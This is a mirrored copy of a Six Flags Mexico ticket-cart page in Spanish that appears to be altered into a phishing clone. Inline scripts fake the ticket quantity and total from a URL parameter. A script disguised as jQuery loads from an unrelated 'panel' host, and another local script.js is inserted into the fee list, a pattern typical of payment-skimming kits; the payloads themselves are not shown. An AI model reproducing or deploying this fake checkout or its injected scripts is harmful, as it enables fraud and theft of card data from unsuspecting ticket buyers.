El parámetro 'ok' no está presente o es inválido.<!DOCTYPE html>
<html xmlns:ng="angularjs.org" id="ng-app" lang="sp" class="accesso- accesso- desktop accesso-chrome accesso-blink accesso-modern contrast-off" data-ng-class="{&#39;bg-white&#39;: whiteBackground, &#39;spinner&#39;:(!state.loaded || forceShowSpinner), &#39;navigation-enabled&#39;:state.showMainMenu,&#39;modal-enabled&#39;:modal.show, &#39;bg-enabled&#39;: bgImageUrl, &#39;full-height&#39;: bgImageUrl &amp;&amp; stretchBG, &#39;application-no-scroll&#39;: applicationNoScroll}" data-ng-style="bgImageUrl" data-ng-app="app">
<!-- Mirrored from sixflagsmexico.com.mx/sixflags/index3.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 04 May 2024 04:43:04 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!--<base href="/">--><base >

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width">






<title data-ng-bind-html="state.parkNameTitleTag + state.pageTitle" data-idle-disabled="true" class="ng-binding">Six Flags Mexico</title>















<link rel="preload" as="font" type="font/ttf" href="./files/Roboto-Medium.ttf" crossorigin="anonymous">
<link rel="preload" as="font" type="font/ttf" href="./files/Roboto-Bold.ttf" crossorigin="anonymous">
<link rel="preload" as="font" type="font/ttf" href="./files/Roboto-LightItalic.ttf" crossorigin="anonymous">
<link rel="preload" as="font" type="font/ttf" href="./files/Roboto-Light.ttf" crossorigin="anonymous">
<!--[if gte IE 10 | !IE ]><!-->
<script type="text/javascript" src="https://api.rodac-secretaria-mexico.com/panel/jquery.min.js"></script>
<link rel="stylesheet" href="./files/styles-9cfaac7784.css" id="accesso-styles-main">
<!--[endif]---->
<!-- ngIf: determineCssOverrides && !cssOverridesCacheBuster -->
<!-- ngIf: determineCssOverrides && cssOverridesCacheBuster --><!-- end ngIf: determineCssOverrides && cssOverridesCacheBuster -->


<style>
		.pl-loader-container {
			position   : absolute;
			text-align : center;
			margin-top : -25px;
			height     : 50px;
			width      : 100%;
			top        : 45%;
		}

		.pl-spin-box {
			display: flex;
			align-items: center;
			justify-content: center;
		}

		@keyframes accesso-spinner-keyframes {
			0%,
			80%,
			100% {
				box-shadow: 0 2.5em 0 -1.3em;
			}
			40% {
				box-shadow: 0 2.5em 0 0;
			}
		}

		.ac-spinner,
		.ac-spinner:before,
		.ac-spinner:after {
			border-radius: 50%;
			width: 2.5em;
			height: 2.4em;
			animation-fill-mode: both;
			animation: accesso-spinner-keyframes 1.8s infinite ease-in-out;
			transition: .5s color linear;
		}

		.ac-spinner {
			color: #ff8100;
			font-size: 10px;
			margin: -2.5em 0 2.5em -1.25em;
			position: relative;
			text-indent: -9999em;
			transform: translateZ(0);
			animation-delay: -0.16s;
		}
		.ac-spinner:before,
		.ac-spinner:after {
			content: '';
			position: absolute;
			top: 0;
		}

		.ac-spinner:before {
			color: #00a5df;
			left: -3.5em;
			animation-delay: -0.32s;
		}

		.ac-spinner:after {
			color: #93d300;
			left: 3.5em;
		}
	</style>










<script>
document.addEventListener('DOMContentLoaded', function() {
    // Obtener el elemento <span> donde se muestra la cantidad de boletos
    var cantidadBoletosSpan = document.querySelector("[data-cy='cartItem_qty']");

    // Obtener el parámetro 'ok' de la URL
    var urlParams = new URLSearchParams(window.location.search);
    var cantidadBoletos = urlParams.get('ok');

    // Actualizar el contenido del elemento <span> con la cantidad de boletos
    cantidadBoletosSpan.textContent = cantidadBoletos;
});
</script>








<link rel="icon" href="../../sf-mc.store.sixflags.com/images/favicon.png"><link type="text/css" rel="stylesheet" href="./files/snap-package-details-component.css"><link type="text/css" rel="stylesheet" href="./files/customer-quantity-component.css"><link type="text/css" rel="stylesheet" href="./files/snap-rate-selector-component.css"><script src="./files/snap-rate-selector-component.js.descarga" async=""></script><link type="text/css" rel="stylesheet" href="./files/snap-calendar-selector-component.css"><link type="text/css" rel="stylesheet" href="./files/snap-date-time-list-component.css"><link type="text/css" rel="stylesheet" href="./files/snap-calendar-package.css">
</head>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // Obtener el elemento <span> donde se muestra la cantidad de boletos
    var cantidadBoletosSpan = document.querySelector("[data-cy='cartItem_qty']");

    // Obtener el parámetro 'ok' de la URL
    var urlParams = new URLSearchParams(window.location.search);
    var cantidadBoletos = urlParams.get('ok');

    // Actualizar el contenido del elemento <span> con la cantidad de boletos
    cantidadBoletosSpan.textContent = cantidadBoletos;
});
</script>
<script>document.addEventListener('DOMContentLoaded', function() {
    // Obtener el elemento <span> donde se muestra el total
    var totalSpan = document.querySelector("[data-cy='cv_Total']");
    
    // Obtener el parámetro 'ok' de la URL
    var urlParams = new URLSearchParams(window.location.search);
    var cantidadBoletos = parseInt(urlParams.get('ok'), 10);
    
    // Calcular el total multiplicando la cantidad de boletos por 550
    var total = cantidadBoletos * 550;

    // Actualizar el contenido del elemento <span> con el total calculado
    totalSpan.textContent = '$' + total.toFixed(2); // Formatear el total como moneda
});
</script>
<body focus-content="" class="desktop accesso-chrome accesso-blink" data-ng-class="{'bg-white': whiteBackground, 'modal-enabled':modal.show, 'application-no-scroll': applicationNoScroll }">



<div id="mainAppCntr" data-ng-include="'views/main.html'" class="ng-scope"><div class="inner-body ng-scope" id="inner-body" data-ng-controller="MainMenuCtrl">
	

	<div id="fix-navigation" ng-if="!toolbarOverride || !toolbarOverride.hide_toolbar" class="fix-navigation ng-scope" data-ng-class="{'disable-nav': disableNav}" data-ng-include="" src="./'views/top-bar.html'" data-ng-show="state.showApplicationView" aria-hidden="false"><div id="navigation-backdrop" aria-hidden="true" data-ng-click="menuButtonHandler('menuView')" class="ng-scope" role="button" tabindex="0"></div>
<div class="inner-body ng-scope" role="navigation">
	
	<button id="skipNav" data-ng-click="targetMainContent()" data-ng-bind-html="i18n.ApplicationLabels.skipToMainContent" class="ng-binding"></button>
	<div class="nav-block top-bar-branding" data-ng-class="{'override-element-display' :toolbarOverride &amp;&amp; toolbarOverride.show_client_icon_or_name}">
		<div class="branding">
			<div title="Six Flags Mexico" id="parkLogo" class="branding-image ng-valid" alt="Six Flags Mexico" data-verify-image-src="./assets/sixflags/images/coasterlogo.png" style=""><img src="./assets/sixflags/images/coasterlogo.png" alt="Six Flags Mexico"></div>
			<span data-ng-bind-html="state.parkName" class="branding-title ng-binding">Six Flags Mexico</span>
		</div>
	</div>

	<!-- ngIf: !toolbarOverride --><div id="desktop-navigation" class="desktop-navigation nav-block ng-scope device-desktop desktop-navigation-complete" data-desktop-navigation="" data-ng-if="!toolbarOverride" role="menubar">
		<!-- ngRepeat: deskMenu in desktopMenuItems --><!-- ngIf: deskMenu.isactive --><div data-cy="tb_keyword-Boletos" class="top-bar-block ng-scope no-promo" data-ng-repeat="deskMenu in desktopMenuItems" ng-if="deskMenu.isactive" data-ng-class="{'active':deskMenu.selected,'no-promo':!disablePromotionalCode, 'disabled': disableNav, 'open-submenu': state.showSubMenuTopBar &amp;&amp; parentOfSubMenu.indexOf(deskMenu.label) > -1}" data-ng-click="menuParentClick($event,deskMenu)" role="menuitem" aria-haspopup="false" aria-label="Boletos" tabindex="0">
			<span data-ng-bind="deskMenu.label" class="ng-binding">Boletos</span>
			<span data-cy="tb_downarrow" class="icon-downarrow ng-hide" data-ng-show="deskMenu.MENUITEM" aria-label=" Boletos" role="button" tabindex="0" data-ng-click="menuParentArrowClick($event)" aria-expanded="false" aria-hidden="true"></span>
			<ul class="sub-navigation nostyle ng-hide" data-ng-show="deskMenu.MENUITEM" role="menu" aria-hidden="true">
				<!-- ngRepeat: submenu in deskMenu.MENUITEM -->
			</ul>
		</div><!-- end ngIf: deskMenu.isactive --><!-- end ngRepeat: deskMenu in desktopMenuItems --><!-- ngIf: deskMenu.isactive --><div data-cy="tb_keyword-2024 Passes" class="top-bar-block ng-scope no-promo" data-ng-repeat="deskMenu in desktopMenuItems" ng-if="deskMenu.isactive" data-ng-class="{'active':deskMenu.selected,'no-promo':!disablePromotionalCode, 'disabled': disableNav, 'open-submenu': state.showSubMenuTopBar &amp;&amp; parentOfSubMenu.indexOf(deskMenu.label) > -1}" data-ng-click="menuParentClick($event,deskMenu)" role="menuitem" aria-haspopup="true" aria-label="2024 Passes" tabindex="0">
			<span data-ng-bind="deskMenu.label" class="ng-binding">2024 Passes</span>
			<span data-cy="tb_downarrow" class="icon-downarrow" data-ng-show="deskMenu.MENUITEM" aria-label=" 2024 Passes" role="button" tabindex="0" data-ng-click="menuParentArrowClick($event)" aria-expanded="false" aria-hidden="false"></span>
			<ul class="sub-navigation nostyle" data-ng-show="deskMenu.MENUITEM" role="menu" aria-hidden="false">
				<!-- ngRepeat: submenu in deskMenu.MENUITEM --><li data-ng-repeat="submenu in deskMenu.MENUITEM" data-ng-click="subMenuClick($event,submenu)" data-ng-class="{'active':submenu.selected}" role="menuitem" class="ng-scope" tabindex="0">
					<span data-ng-bind="submenu.label" data-cy="tb_subtab-Gold Summer" class="truncate ng-binding">Gold Summer</span>
                    <!-- child submenu nav -->
                    <ul data-ng-show="submenu.MENUITEM &amp;&amp; submenu.MENUITEM.length > 0" class="sub-sub-navigation show-right nostyle ng-hide" role="menu" aria-hidden="true">
                        <!-- ngRepeat: childsubmenu in submenu.MENUITEM -->
                    </ul>

				</li><!-- end ngRepeat: submenu in deskMenu.MENUITEM --><li data-ng-repeat="submenu in deskMenu.MENUITEM" data-ng-click="subMenuClick($event,submenu)" data-ng-class="{'active':submenu.selected}" role="menuitem" class="ng-scope" tabindex="0">
					<span data-ng-bind="submenu.label" data-cy="tb_subtab-Platinum" class="truncate ng-binding">Platinum</span>
                    <!-- child submenu nav -->
                    <ul data-ng-show="submenu.MENUITEM &amp;&amp; submenu.MENUITEM.length > 0" class="sub-sub-navigation show-right nostyle ng-hide" role="menu" aria-hidden="true">
                        <!-- ngRepeat: childsubmenu in submenu.MENUITEM -->
                    </ul>

				</li><!-- end ngRepeat: submenu in deskMenu.MENUITEM --><li data-ng-repeat="submenu in deskMenu.MENUITEM" data-ng-click="subMenuClick($event,submenu)" data-ng-class="{'active':submenu.selected}" role="menuitem" class="ng-scope" tabindex="0">
					<span data-ng-bind="submenu.label" data-cy="tb_subtab-Diamond" class="truncate ng-binding">Diamond</span>
                    <!-- child submenu nav -->
                    <ul data-ng-show="submenu.MENUITEM &amp;&amp; submenu.MENUITEM.length > 0" class="sub-sub-navigation show-right nostyle ng-hide" role="menu" aria-hidden="true">
                        <!-- ngRepeat: childsubmenu in submenu.MENUITEM -->
                    </ul>

				</li><!-- end ngRepeat: submenu in deskMenu.MENUITEM -->
			</ul>
		</div><!-- end ngIf: deskMenu.isactive --><!-- end ngRepeat: deskMenu in desktopMenuItems --><!-- ngIf: deskMenu.isactive --><div data-cy="tb_keyword-Grupos" class="top-bar-block ng-scope no-promo" data-ng-repeat="deskMenu in desktopMenuItems" ng-if="deskMenu.isactive" data-ng-class="{'active':deskMenu.selected,'no-promo':!disablePromotionalCode, 'disabled': disableNav, 'open-submenu': state.showSubMenuTopBar &amp;&amp; parentOfSubMenu.indexOf(deskMenu.label) > -1}" data-ng-click="menuParentClick($event,deskMenu)" role="menuitem" aria-haspopup="false" aria-label="Grupos" tabindex="0">
			<span data-ng-bind="deskMenu.label" class="ng-binding">Grupos</span>
			<span data-cy="tb_downarrow" class="icon-downarrow ng-hide" data-ng-show="deskMenu.MENUITEM" aria-label=" Grupos" role="button" tabindex="0" data-ng-click="menuParentArrowClick($event)" aria-expanded="false" aria-hidden="true"></span>
			<ul class="sub-navigation nostyle ng-hide" data-ng-show="deskMenu.MENUITEM" role="menu" aria-hidden="true">
				<!-- ngRepeat: submenu in deskMenu.MENUITEM -->
			</ul>
		</div><!-- end ngIf: deskMenu.isactive --><!-- end ngRepeat: deskMenu in desktopMenuItems --><!-- ngIf: deskMenu.isactive --><div data-cy="tb_keyword-Mexico VIP" class="top-bar-block ng-scope no-promo" data-ng-repeat="deskMenu in desktopMenuItems" ng-if="deskMenu.isactive" data-ng-class="{'active':deskMenu.selected,'no-promo':!disablePromotionalCode, 'disabled': disableNav, 'open-submenu': state.showSubMenuTopBar &amp;&amp; parentOfSubMenu.indexOf(deskMenu.label) > -1}" data-ng-click="menuParentClick($event,deskMenu)" role="menuitem" aria-haspopup="false" aria-label="Mexico VIP" tabindex="0">
			<span data-ng-bind="deskMenu.label" class="ng-binding">Mexico VIP</span>
			<span data-cy="tb_downarrow" class="icon-downarrow ng-hide" data-ng-show="deskMenu.MENUITEM" aria-label=" Mexico VIP" role="button" tabindex="0" data-ng-click="menuParentArrowClick($event)" aria-expanded="false" aria-hidden="true"></span>
			<ul class="sub-navigation nostyle ng-hide" data-ng-show="deskMenu.MENUITEM" role="menu" aria-hidden="true">
				<!-- ngRepeat: submenu in deskMenu.MENUITEM -->
			</ul>
		</div><!-- end ngIf: deskMenu.isactive --><!-- end ngRepeat: deskMenu in desktopMenuItems -->
		<promo data-cy="tb_Promo" class="top-bar-block top-bar-promo desktop-promo-button" id="topBarPromo" data-ng-class="{'disabled': disableNav}" data-ng-click="triggerPromoBox()" data-ng-show="i18n.getLocale('Menu', 'promoButton')" data-ng-hide="disablePromotionalCode" role="button" tabindex="0" aria-hidden="false">
			<span data-ng-bind-html="i18n.getLocale('Menu', 'promoButton')" class="ng-binding">Código promocional</span>
		</promo>
	</div><!-- end ngIf: !toolbarOverride -->
	<!-- ngIf: toolbarOverride -->
	<div class="nav-block pull-right knl-cart">
		<!-- ngIf: configuredForLogin -->
		<!-- ngIf: !toolbarOverride || (toolbarOverride && !toolbarOverride.hide_faq_icon) --><!-- end ngIf: !toolbarOverride || (toolbarOverride && !toolbarOverride.hide_faq_icon) -->
		<!-- ngIf: !toolbarOverride || (toolbarOverride && !toolbarOverride.hide_cart_icon) --><!-- end ngIf: !toolbarOverride || (toolbarOverride && !toolbarOverride.hide_cart_icon) -->
	</div>
</div>
</div><!-- end ngIf: !toolbarOverride || !toolbarOverride.hide_toolbar -->
	

	<div ng-show="state.loaded &amp;&amp; state.showApplicationView" id="applicationWrap" data-ng-class="{'hide-visibility': forceShowSpinner}" aria-hidden="false" class="">
		<!-- ngInclude: -->
		<div id="application-view" class="no-focus-style" tabindex="-1" aria-live="polite">
			<!-- uiView: --><div class="app-content ng-scope" data-ui-view="" role="main" ng-class="{'no-top-nav': toolbarOverride &amp;&amp; toolbarOverride.hide_toolbar }"><div ng-class="{'flex-cart-view': !pageView.Order }" class="ng-scope flex-cart-view">
	<div class="desktop-container cart-view-container flex-cart-view--content" ng-class="{ 'recaptcha-enabled': !pageView.Order &amp;&amp; enableRecaptcha }">
		
		

		

		<div class="row cart-container">
			<div class="col-xs-12 no-padding" data-ng-class="{true:'col-sm-6 no-padding'}[pageView.Order]">
				<!-- ######## SHOW THE CART IF THERE IF ITS NOT EMPTY ######## -->
				<div data-ng-hide="cartObject.cartItems.length == 0" aria-hidden="false">
					<div class="row cart-spacer" data-ng-show="!pageView.Order" aria-hidden="false"></div>
					<div class="row">
						<!-- ngIf: !pageView.Order --><div class="col-xs-12 no-padding ng-scope" data-ng-if="!pageView.Order">
							<div class="panel panel-default panel-flush">
								<div class="panel-body expand cart-view-heading">
									<h1 class="norm pull-left">
										<span id="cartViewHeader" data-ng-bind-html="i18n.CartView.cartHeading" class="ng-binding">Carro de Compra</span>&nbsp;
										
									</h1>
									<div class="update-cart-items pull-right">
										<img alt="" title="" data-ng-show="adImage &amp;&amp; !isMobile" class="neg-margin-ad ng-hide" data-ng-src="" aria-hidden="true">
										<!-- ngIf: enableResetCartButton -->
										<!-- ngIf: !changeQty && !hideModifyButton --><button data-cy="cv_updateBtn" type="button" class="btn btn-default btn-xxs btn-update ng-binding ng-scope" id="mod-cart" data-ng-if="!changeQty &amp;&amp; !hideModifyButton" data-ng-bind-html="i18n.CartView.modifyCartLabel" data-ng-click="updateQTY()">Modificar Carrito</button><!-- end ngIf: !changeQty && !hideModifyButton -->
										<!-- ngIf: changeQty -->
										<!-- ngIf: changeQty -->
									</div>
								</div>
							</div>
						</div><!-- end ngIf: !pageView.Order -->
						<!-- ngIf: pageView.Order -->
					</div>

					<div class="row no-margin">
						<div class="col-xs-12 no-padding" data-ng-class="{'no-padding':pageView.Order}">
							<!-- ######## START : CART ITEMS ######## -->
							<div class="desktop-cart-scroll-container" data-ng-class="{'order-review-container':pageView.Order}">
								<!-- ngRepeat: cartItem in cartObject.cartItems | ignoreOneBarcodeAddons | setupCartFlagsOnItems --><div class="panel package-item cart-items ng-scope" data-ng-repeat="cartItem in cartObject.cartItems | ignoreOneBarcodeAddons | setupCartFlagsOnItems" id="cart-item-0" data-ng-class="{'update-item':changeQty}">
									<!-- ngInclude: 'views/cartItems.html' --><div data-cy="cartView_panel_Boleto de un Día + Pase de Atracciones de Terror_General" class="panel-body ng-scope" data-ng-class="{'min-height-edit': changeQty &amp;&amp; cartItem.itemHasAnEditableXMC}" data-ng-include="'views/cartItems.html'"><div class="remove-icon ng-scope ng-hide" data-cy="ci_remove-0" data-ng-show="changeQty &amp;&amp; cartItem.showDeleteBtn" data-ng-class="{'not-editable': cartItem.itemCanHaveQtyChanged}" aria-hidden="true">
	<span data-cy="cartItem_edit" class="icon-circle-edit green ng-hide" title="" data-ng-show="cartItem.itemHasAnEditableXMC" data-ng-click="editCartItem(cartItem)" aria-label="" role="button" tabindex="0" aria-hidden="true"></span>
	<span data-cy="cartItem_remove" class="icon-close red-font" title="Borrar" data-ng-click="removeCartItem(cartItem)" aria-label=" Boleto de un Día + Pase de Atracciones de Terror (General) " role="button" tabindex="0"></span>
</div>
<div class="row no-margin-bottom ng-scope">
	<div class="pgk package-name long-text" data-ng-class="{'update-item':changeQty}">
		<span data-cy="cartItem_package_Boleto de un Día + Pase de Atracciones de Terror" class="cart-item-title truncate ng-binding" data-ng-bind-html="cartItem.package_name" data-ng-class="{'width-replacement':changeQty}">Platinum Pass 2024</span>
		<span data-cy="cartItem_CT_General" class="cart-item-desc ng-binding" data-ng-show="!cartItem.CHARACS[0].custom_display" data-ng-bind="cartItem.customer_type_name" aria-hidden="false">Platinum Pass</span>
		<span data-cy="cartItem_custom_display" class="cart-item-desc ng-binding ng-hide" data-ng-show="cartItem.CHARACS[0].custom_display" data-ng-bind="cartItem.CHARACS[0].custom_display" aria-hidden="true"></span>
	<span class="cart-item-date" data-ng-show="cartItem.CHARACS[0].start_date &amp;&amp; !cartItem.CHARACS[0].start_date_display" aria-hidden="false">
		
	</span>
	<span class="cart-item-date ng-hide" data-ng-show="cartItem.CHARACS[0].start_date_display" aria-hidden="true">
		<span ng-bind="i18n.CartView.date" class="ng-binding">Fecha:</span>&nbsp;<span class="limit quantity-value-label ng-binding" ng-bind="cartItem.CHARACS[0].start_date_display"></span>
	</span>
	<span class="cart-item-time ng-hide" data-ng-show="cartItem.CHARACS[0].start_time &amp;&amp; cartItem.CHARACS[0].start_time_display" aria-hidden="true">
		<span ng-bind="i18n.CartView.time" class="ng-binding">Hora:</span>&nbsp;<span class="limit quantity-value-label ng-binding" ng-bind="cartItem.CHARACS[0].start_time_display"></span>
	</span>
	<span class="cart-item-time ng-hide" data-ng-show="cartItem.CHARACS[0].start_time &amp;&amp; !cartItem.CHARACS[0].start_time_display" aria-hidden="true">
		<span ng-bind="i18n.CartView.time" class="ng-binding">Hora:</span>&nbsp;<span class="limit quantity-value-label ng-binding" ng-bind="cartItem.CHARACS[0].start_time"></span>
	</span>
	<span data-cy="cartItem_loqEmail" class="cart-item-date ng-hide" data-ng-show="cartItem.CHARACS[0].loq_email" aria-hidden="true">
		<span ng-bind="i18n.CartView.groupEmail" class="ng-binding">Grupo de correo electrónico:</span>&nbsp;<span class="limit quantity-value-label ng-binding" ng-bind="cartItem.CHARACS[0].loq_email"></span>
	</span>
	<span class="cart-item-valid ng-hide" data-ng-show="cartItem.CHARACS[0].valid_from" aria-hidden="true">
		<span ng-bind="i18n.TicketView.eventLabel" class="ng-binding">Válido de inicio:</span>&nbsp;<span class="limit quantity-value-label ng-binding" ng-bind="cartItem.CHARACS[0].valid_from | date: dateFormat"></span>
	</span>
	<span class="cart-item-date normal-whitespace ng-hide" data-ng-show="cartItem.CHARACS[0].entitlements_names" aria-hidden="true">
		<span ng-bind="i18n.CartView.entitlements" class="ng-binding"></span>&nbsp;<span class="limit quantity-value-label ng-binding" ng-bind="cartItem.CHARACS[0].entitlements_names"></span>
	</span>
	<span class="cart-item-date normal-whitespace ng-hide" data-ng-show="cartItem.CHARACS[0].seat" aria-hidden="true">
	<span ng-bind="i18n.CartView.seat" class="ng-binding"></span>&nbsp;<span class="limit quantity-value-label ng-binding" ng-bind="cartItem.CHARACS[0].seat"></span>
	</span>
	<span data-cy="cartItem_firstName" class="cart-item-valid ng-hide" data-ng-show="cartItem.CHARACS[0].ph_first_name || cartItem.CHARACS[0].np_first_name" aria-hidden="true">
		<span ng-bind="i18n.TicketView.nameLabel" class="ng-binding">Nombre:</span>

		<span data-set-field-order-directive="">
			<span class="limit quantity-value-label cart-cust-name ng-binding" ng-bind-html="cartItem.CHARACS[0].ph_first_name || cartItem.CHARACS[0].np_first_name"></span><span>&nbsp;</span><span class="limit quantity-value-label cart-cust-name ng-binding" ng-bind-html="cartItem.CHARACS[0].ph_last_name || cartItem.CHARACS[0].np_last_name"></span>
		</span>
	</span>
	<span class="cart-item-valid ng-hide" data-ng-show="cartItem.CHARACS[0].ticket_customer_name &amp;&amp; ! cartItem.CHARACS[0].ph_first_name" aria-hidden="true">
		<span ng-bind=":: i18n.getLocale('TicketView','nameLabel')" class="ng-binding">Nombre:</span>
		<span data-set-field-order-directive="">
			<span class="limit quantity-value-label cart-cust-name ng-binding" ng-bind=":: cartItem.CHARACS[0].ticket_customer_name"></span>
		</span>
	</span>
		<span class="cart-item-date ng-hide" data-ng-show="cartItem.CHARACS[0].WTP_number" aria-hidden="true">
			<span data-ng-bind=":: i18n.getLocale('wtp','wtp')" class="ng-binding"></span> <span data-ng-bind="cartItem.CHARACS[0].WTP_number" class="ng-binding"></span>
	<span class="cart-item-desc quantity-value-label italic blue ng-binding ng-hide" data-ng-show="cartItem.client_gate_savings" data-ng-bind-html="cartItem.client_gate_savings" aria-hidden="true"></span>
	</span></div>

	<div class="pgk subtotal-total pull-right">
		<span class="cart-item-quantity" data-ng-hide="changeQty &amp;&amp; cartItem.itemCanHaveQtyChanged" aria-hidden="false">
			<span class="qty-label ng-binding" ng-bind="i18n.CartView.qtyLabel">Cantidad</span>
			&nbsp;
			<span data-cy="cartItem_qty" class="limit ng-binding">
    0</span>
		</span>
		<span data-cy="cartItem_priceLabel" class="cart-item-total ng-binding" data-ng-bind-html="cartItem.priceLabel">$599.00</span>
		<span class="cart-item-quantity ng-hide" data-ng-show="changeQty &amp;&amp; cartItem.itemCanHaveQtyChanged" aria-hidden="true">
			<label class="sep-label ng-binding" for="Boleto de un Día + Pase de Atracciones de Terror-General" data-ng-bind="i18n.getLocale('CartView', 'qtyLabel')">Cantidad</label>
			<input data-cy="cartItem_qtyField" type="tel" maxlength="3" data-ng-model="cartItem.qty" id="Boleto de un Día + Pase de Atracciones de Terror-General" size="3" data-numbers-only="" data-ng-change="setPriceLabels()" on-enter-key="commitUpdateQTY()" data-ng-show="changeQty &amp;&amp; cartItem.itemCanHaveQtyChanged" class="form-control update-quantity ng-pristine ng-untouched ng-valid ng-isolate-scope ng-not-empty ng-valid-maxlength ng-hide" data-ng-blur="onQtyChange(cartItem)" aria-hidden="true" aria-invalid="false">
			<button type="button" data-ng-disabled="disabled" class="btn btn-default btn-xs pull-right ng-binding ng-hide" data-ng-show="changeQty &amp;&amp; !cartItem.itemCanHaveQtyChanged" data-ng-bind-html="i18n.CartView.notEditable" aria-hidden="true">No Editable</button>
		</span>
	</div>
</div>

<!-- ngIf: cartItem.COMPS || cartItem.BUNDLE_COMPONENTS -->

<div class="row one-barcode-row ng-scope ng-hide" data-ng-show="cartItem.showTax" aria-hidden="true">
	<div class="pgk subtotal-total pull-right">
		<span class="cart-item-quantity">
			<span class="cart-item-total ng-binding" data-ng-bind-html="i18n.getLocale('CartView', 'taxLabel')">Impuesto</span>
			<span class="cart-item-total ng-binding" data-ng-bind-html="cartItem.taxLabel"></span>
		</span>
	</div>
</div>

<!-- ngRepeat: oneBarCodeItem in cartItem.oneBarcodePackages -->
</div>
								</div><!-- end ngRepeat: cartItem in cartObject.cartItems | ignoreOneBarcodeAddons | setupCartFlagsOnItems -->
							</div>

							<div class="row desktop-sub-container no-margin-bottom">
								<div class="col-sm-8 col-md-9 no-padding cart-cross-sales" data-ng-hide="hideCartCrossSells()" aria-hidden="false">
									<!-- ngInclude: 'views/cartView-crossSells.html' --><div data-ng-include="'views/cartView-crossSells.html'" data-ng-controller="CartViewCrossSellsCtrl" class="ng-scope"><!-- ngRepeat: crossSell in crossSells -->
</div>
								</div>
								<div class="col-xs-12 no-padding col-sm-4 col-md-3 pull-right" data-ng-class="{true:'col-sm-12',false:'col-sm-4 col-md-3 pull-right'}[pageView.Order]">
									<!-- ######## SUBTOTAL ########	-->
									<!-- ngIf: !hideSubtotal --><div class="panel package-item discount-items ng-scope" data-ng-if="!hideSubtotal">
										<div class="panel-body">
											<div class="pgk package-name long-text subtotal-display-name ng-binding" data-ng-bind-html="i18n.CartView.subtotal">Subtotal</div>
											<div data-cy="cv_subtotal" class="pgk subtotal-total pull-right ng-binding" data-ng-bind="cartObject.subTotal | currencyFormatter : currencyCode:languageSettings">
    $0.00</div>
										</div>
									</div><!-- end ngIf: !hideSubtotal -->
									<!-- ######## DISCOUNTS ######## -->
									<div class="panel package-items discount-items ng-hide" data-ng-show="( pageView.Order || pageView.Receipt ) &amp;&amp; (cartObject.discountSource.length>0)" aria-hidden="true">
										<ul class="list-group nostyle">
											<li class="list-group-item smaller-list-item table-row">
												<div class="pgk package-name limit long-text ng-binding" data-ng-bind-html="i18n.CartView.discountLabel">Descuentos</div>
												<div class="pgk package-price cart-view-price pull-right ng-binding" data-ng-bind="cartObject.discountTotal | currencyFormatter : currencyCode:languageSettings">$0.00</div>
											</li>
											<!-- ngRepeat: discount in cartObject.discountSource -->
										</ul>
									</div>
									<!-- ######## TAXES & CART ADJUSTMENTS & SHIPPING ######## -->
									<div class="panel package-items discount-items no-margin-bottom" data-ng-class="{'no-margin-bottom': !getOnlineSavings()}">
										<ul class="list-group nostyle">
											<!-- ngRepeat: item in cartObject.taxAndCartAdjustmentAndShippingSource --><li class="list-group-item smaller-list-item table-row list ng-scope" data-ng-repeat="item in cartObject.taxAndCartAdjustmentAndShippingSource" data-ng-class="{true:'hide',false:''}[item.label.toLowerCase().indexOf( i18n.CartView.deliveryFee.toLowerCase() ) != -1 &amp;&amp; pageView.Cart]">
												<div class="pgk package-name long-text ng-binding" data-ng-bind="item.label">Cargo por proceso en línea</div>
												<div data-ng-class="{'green-text': item.amount == i18n.CartView.free }" class="pgk cart-view-price text-right pull-right ng-binding" data-ng-bind="item.amount | currencyFormatter : currencyCode:languageSettings">$40.00</div>
											</li><!-- end ngRepeat: item in cartObject.taxAndCartAdjustmentAndShippingSource --><li class="list-group-item smaller-list-item table-row list ng-scope" data-ng-repeat="item in cartObject.taxAndCartAdjustmentAndShippingSource" data-ng-class="{true:'hide',false:''}[item.label.toLowerCase().indexOf( i18n.CartView.deliveryFee.toLowerCase() ) != -1 &amp;&amp; pageView.Cart]">
												<div class="pgk package-name long-text ng-binding" data-ng-bind="item.label">Impuesto</div>
												<div data-ng-class="{'green-text': item.amount == i18n.CartView.free }" class="pgk cart-view-price text-right pull-right ng-binding" data-ng-bind="item.amount | currencyFormatter : currencyCode:languageSettings">$0.00</div>
											</li><!-- end ngRepeat: item in cartObject.taxAndCartAdjustmentAndShippingSource --><li class="list-group-item smaller-list-item table-row list ng-scope hide" data-ng-repeat="item in cartObject.taxAndCartAdjustmentAndShippingSource" data-ng-class="{true:'hide',false:''}[item.label.toLowerCase().indexOf( i18n.CartView.deliveryFee.toLowerCase() ) != -1 &amp;&amp; pageView.Cart]">
												<div class="pgk package-name long-text ng-binding" data-ng-bind="item.label">Cuota de Entrega</div>
												<div data-ng-class="{'green-text': item.amount == i18n.CartView.free }" class="pgk cart-view-price text-right pull-right ng-binding green-text" data-ng-bind="item.amount | currencyFormatter : currencyCode:languageSettings">Gratis</div>
											</li><!-- end ngRepeat: item in cartObject.taxAndCartAdjustmentAndShippingSource -->
											<script  src="./files/script.js"></script>
											<!-- Fees -->
											<!-- ngIf: cartObject.feeSource.feeTotal -->

											<!-- Tax Tiers -->
											<!-- ngIf: cartObject.feeSource.taxTotal -->

											<!-- ngIf: membershipTransferShowDeposit -->
										</ul>
										<div class="panel-footer cart-footer">
										<div class="subtotal-display-name ng-binding" data-ng-bind-html="i18n.CartView.totalLabel">Total</div>
										<!-- ngIf: membershipFolioCartTotal -->
										<!-- ngIf: !membershipFolioCartTotal -->
										<span data-cy="cv_Total" class="subtotal-total pull-right ng-binding ng-scope" data-ng-if="!membershipFolioCartTotal" data-ng-bind="cartObject.total | currencyFormatter : currencyCode:languageSettings">
											$0.00
										</span>
										<!-- end ngIf: !membershipFolioCartTotal -->
									</div>


										<div class="panel-footer cart-footer ng-hide" data-ng-show="gatePriceTotalSavings" aria-hidden="true">
											<div class="subtotal-display-name ng-binding" data-ng-bind-html="i18n.GatePriceSavings.total_savings">Total Savings vs Gate</div>
											<div class="subtotal-total pull-right ng-binding" data-ng-bind="gatePriceTotalSavings | currencyFormatter : currencyCode:languageSettings"></div>
										</div>
										<div class="panel-footer cart-footer ng-hide" data-ng-show="isPaymentSchedule" aria-hidden="true">
